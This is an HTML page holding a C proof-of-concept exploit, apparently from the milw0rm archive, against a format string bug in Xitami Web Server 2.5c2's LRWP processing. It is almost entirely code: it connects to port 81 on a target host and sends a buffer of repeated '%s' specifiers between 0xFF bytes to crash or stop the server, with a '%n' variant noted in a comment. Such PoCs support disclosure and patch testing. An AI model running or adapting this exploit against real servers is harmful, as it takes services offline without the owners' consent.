<html><head><title>Xitami Web Server v2.5c2 LRWP Processing Format String PoC</title></head><pre>/**
 *
 * PoC exploit for Xitami Web Server v2.5c2 LRWP processing format string bug
 * Advisory is available at: http://www.bratax.be/advisories/b013.html
 * (multiple vulnerabilities! check it out!)
 *
 * @author: bratax
 * @url: http://www.bratax.be/
 * @email: bratax@gmail.com
 *
 * Thanks to BuzzDee for learning me how to use reverse code engineering to
 * find bugs &amp; thanks to DiabloHorn as well ;-)
 * Greetz to NR!
 *
**/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;winsock2.h&gt;

#pragma comment(lib, &quot;ws2_32.lib&quot;)
#define PORT 81 // target port

int main(int argc, char *argv[]){

  int sockfd;
  struct hostent *he;
  struct sockaddr_in their_addr;
  WSADATA wsaData;
  char formatstring[250];

  if (argc != 2){
    printf(&quot;\nXitami Web Server 2.5c2\n&quot; );
    printf(&quot;Format String PoC by bratax - http://www.bratax.be/\n\n&quot;);
    printf(&quot;[+] tested on WinXP Pro SP2 &amp; Vista\n&quot;);
    printf(&quot;[+] usage: %s &lt;hostname&gt;\n\n&quot;, argv[0]);
    return -1;
  }

    if (WSAStartup(MAKEWORD(1, 1), &amp;wsaData) != 0) {
    fprintf(stderr, &quot;WSAStartup failed.\n&quot;);
    return -1;
  }

  if ((he=gethostbyname(argv[1])) == NULL){  // get the host info
    perror(&quot;gethoscattbyname&quot;);
    return -1;
  }

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
    perror(&quot;socket&quot;);
    return -1;
  }

  their_addr.sin_family = AF_INET;  // host byte order
  their_addr.sin_port = htons(PORT);  // short, network byte order
  their_addr.sin_addr = *((struct in_addr *)he-&gt;h_addr);
  memset(&amp;(their_addr.sin_zero), '\0', 8); // zero the rest of the struct

  if (connect(sockfd, (struct sockaddr *)&amp;their_addr,sizeof(struct sockaddr)) == -1){
    printf(&quot;[-] Connect failed.\n&quot;);
    closesocket(sockfd);
    return -1;
  }

  printf(&quot;[+] Server is listening...\n&quot;);

  Sleep(1000);

  /*
    setup format string request:
              %s*100 + \xFF + somestring + \xFF     (program termination)
    or:
              %n + \xFF + somestring + \xFF         (program crash)
  */

  memset(formatstring,'\x41', sizeof(formatstring));
  for (int i = 0; i&lt;200; i+=2){
    memcpy(formatstring+i, &quot;%s&quot;, 2);
  }
  memcpy(formatstring+200, &quot;\xFF&quot;, 1);
  memcpy(formatstring+249, &quot;\xFF&quot;, 1);

  printf(&quot;[+] Sending format string request...&quot;);
  Sleep(2000);

  if (send(sockfd,formatstring,sizeof(formatstring),0) == -1) {
    Sleep(2000);
    printf(&quot;failed! Exiting...\n&quot;);
    closesocket(sockfd);
    WSACleanup();
    return -1;
  }

  Sleep(2000);
  closesocket(sockfd);
  printf(&quot;done.\n&quot;);


  return 0;
}

// milw0rm.com [2008-04-03]</pre></html>